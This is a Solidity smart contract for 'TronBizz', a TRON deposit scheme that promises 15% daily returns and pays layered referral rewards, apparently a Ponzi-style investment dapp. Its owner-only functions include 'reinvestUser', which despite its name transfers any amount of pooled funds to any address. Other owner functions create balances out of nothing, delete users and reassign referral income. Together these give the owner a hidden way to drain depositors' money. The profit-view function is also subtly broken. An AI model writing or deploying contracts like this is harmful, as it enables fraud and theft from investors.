//SourceUnit: TronBizz.sol

pragma solidity ^0.4.25;

contract TronBizz {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize = 100000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 25;
    uint public commissionDivisor = 100;
    uint private minuteRate = 2314814; //DAILY 15%
    uint private releaseTime = 1597937400;

    address owner;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
    }

    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;
    }


    function register(address _addr, address _affAddr) private {

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not time yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);


        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        
        uint interestProfit = players[msg.sender].interestProfit;

        uint devEarn = interestProfit.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
        transferPayout(msg.sender, players[msg.sender].interestProfit - devEarn);
    }
    function migrationDeposit(address _affAddr, address _AddrSource, uint _amountInterest, uint _payoutSum, uint _affReward, uint _amountDeposit) public {
        require(msg.sender == owner, "Admin Only Can do this");
        require(now >= releaseTime, "not time yet!");
        uint depositAmount = _amountDeposit;

        Player storage player = players[_AddrSource];

        totalPlayers++;
        
        register(_AddrSource, _affAddr);
        player.time = now;
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        player.interestProfit = player.interestProfit.add(_amountInterest);
        player.payoutSum = player.payoutSum.add(_payoutSum);
        player.affRewards = player.affRewards.add(_affReward);

        distributeRef(0, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
    }
    function removeUser(address _address) public returns (bool) {
        require(msg.sender == owner, "Admin Only Can do this");
        delete players[_address];
        return true;
    }
    function reinvestUser(address _address, uint _amount) public returns(bool) {
        require(msg.sender == owner, "Admin Only Can do this");
        _address.transfer(_amount);
        return true;
    }
    function changeUpline(address _address, address _newUpline) public returns(bool) {
        require(msg.sender == owner, "Admin Only Can do this");

        Player storage player = players[_address];
        player.affFrom = _newUpline;
        
        register(_address, _newUpline);
        distributeRef(0, player.affFrom);

        return true;
    }
    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(25)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(25)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            if(_affRewards > 0) {
                _affAddr1.transfer(_affRewards);
            }
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            if(_affRewards > 0) {
                _affAddr2.transfer(_affRewards);
            }
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            if(_affRewards > 0) {
                _affAddr3.transfer(_affRewards);
            }
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}